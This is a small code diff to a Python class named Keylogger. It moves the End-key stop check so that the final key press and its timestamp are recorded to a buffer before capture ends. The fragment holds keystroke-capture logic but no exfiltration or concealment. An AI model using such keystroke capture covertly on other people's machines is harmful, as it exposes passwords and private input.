@@ -25,11 +25,11 @@ class Keylogger:
         """
         if key in self.__pressed_keys:
             return True
-        if str(key) == 'Key.end':
-            return False
         self.__pressed_keys.append(key)
         press_time = time.time()
         self.__buffer.write_to_buffer([str(key), press_time, True])
+        if str(key) == 'Key.end':
+            return False
         return True
 
     def __init__(self, buffer: Buffer):
